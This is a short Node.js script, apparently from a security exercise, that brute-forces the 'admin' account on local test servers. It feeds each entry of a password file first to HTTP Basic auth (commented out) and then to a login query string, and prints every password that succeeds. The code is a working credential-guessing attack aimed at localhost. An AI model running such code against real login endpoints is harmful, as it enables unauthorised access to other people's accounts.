import fs from 'fs';
import fetch from 'node-fetch';

const passwords = fs
  .readFileSync('./passwords.txt', { encoding: 'utf-8' })
  .split('\n');

passwords.forEach(async (password) => {
  try {
    // zad2
    // const res = await fetch('http://127.0.0.1:8080', {
    //   headers: {
    //     Authorization: `Basic ${Buffer.from(`admin:${password}`).toString(
    //       'base64',
    //     )}`,
    //   },
    // });
    // if (res.status !== 401) {
    //   console.log(password);
    // }

    // zad3
    const res = await fetch(
      `http://127.0.0.1:4000/users?login=admin&pass=${password}`,
    );

    if (res.ok) {
      console.log(password);
    }
  } catch (e) {}
});
